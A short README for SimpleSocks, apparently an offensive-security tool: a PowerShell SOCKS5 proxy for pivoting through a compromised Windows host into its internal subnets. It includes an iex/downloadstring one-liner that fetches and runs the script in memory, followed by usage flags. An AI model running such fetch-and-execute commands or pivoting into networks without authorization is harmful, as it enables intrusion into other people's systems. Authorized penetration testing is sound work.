# SimpleSocks
A PowerShell SOCKS5 proxy that accepts connections on `127.0.0.1` (for example through SSH tunnels, redirectors or other local forwards) and pushes them out into whatever networks the host can reach.

Useful for network pivoting when you proxy traffic with tools like Proxifier or Proxychains and need to route it through a compromised Windows host into its internal subnets.

## Load in memory

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/SimpleSocks/refs/heads/main/SimpleSocks.ps1')
```

## Usage

If no flags are provided SimpleSocks will default to -ListenPort 1080 -MaxConcurrent 256

```
SimpleSocks
```
```
SimpleSocks -ListenPort 1080
```
```
SimpleSocks -ListenPort 1080 -MaxConcurrent 256
```
